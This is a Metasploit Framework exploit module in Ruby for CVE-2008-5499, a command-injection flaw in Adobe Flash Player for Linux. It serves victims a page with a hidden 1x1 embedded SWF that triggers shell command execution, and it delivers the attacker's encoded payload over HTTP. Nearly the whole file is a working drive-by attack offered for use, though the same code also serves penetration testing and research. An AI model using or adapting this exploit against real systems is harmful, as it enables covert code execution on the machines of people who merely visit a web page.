# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Adobe Flash Player ActionScript Launch Command Execution Vulnerability&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability in Adobe Flash Player for Linux,
          version  10.0.12.36 and 9.0.151.0 and prior.
          An input validation vulnerability allows command execution when the browser
          loads a SWF file which contains shell metacharacters in the arguments to
          the ActionScript launch method.

          The victim must have Adobe AIR installed for the exploit to work. This module
          was tested against version 10.0.12.36 (10r12_36).
        },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;0a29406d9794e4f9b30b3c5d6702c708&#039;, # Metasploit version
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2008-5499&#039;],
          [&#039;OSVDB&#039;, &#039;50796&#039;],
          [&#039;URL&#039;, &#039;http://www.adobe.com/support/security/bulletins/apsb08-24.html&#039;],
          [&#039;URL&#039;, &#039;http://www.securityfocus.com/bid/32896/exploit&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;HTTP::chunked&#039;     => true
        },
      &#039;Platform&#039;       => &#039;unix&#039;, # so unix cmd exec payloads are ok
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {}],
        ],
      &#039;DisclosureDate&#039; => &#039;Dec 17 2008&#039;,
      &#039;DefaultTarget&#039;  => 0))

  end

  def exploit
    path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2008-5499.swf" )
    fd = File.open( path, "rb" )
    @swf = fd.read(fd.stat.size)
    fd.close

    super
  end

  def on_request_uri(cli, request)
    msg = "#{cli.peerhost.ljust(16)} #{self.shortname}"
    trigger = @swf
    trigger_file = rand_text_alpha(rand(6)+3) + ".swf"

    obj_id = rand_text_alpha(rand(6)+3)

    if request.uri.match(/\.swf/i)
      print_status("#{msg} Sending Exploit SWF")
      send_response(cli, trigger, { &#039;Content-Type&#039; => &#039;application/x-shockwave-flash&#039; })
      return
    end

    if request.uri.match(/\.txt/i)
      send_response(cli, payload.encoded, { &#039;Content-Type&#039; => &#039;text/plain&#039; })
      return
    end

    html =  <<-EOS
    <html>
      <head>
      </head>
      <body>
      <center>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="#{obj_id}" width="1" height="1" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
        <param name="movie" value="#{get_resource}#{trigger_file}" />
        <embed src="#{get_resource}#{trigger_file}" quality="high" width="1" height="1" name="#{obj_id}" align="middle" allowNetworking="all"
          type="application/x-shockwave-flash"
          pluginspage="http://www.macromedia.com/go/getflashplayer">
        </embed>

      </object>
    </center>

    </body>
    </html>
    EOS

    print_status("#{msg} Sending HTML...")
    send_response(cli, html, { &#039;Content-Type&#039; => &#039;text/html&#039; })
  end
end



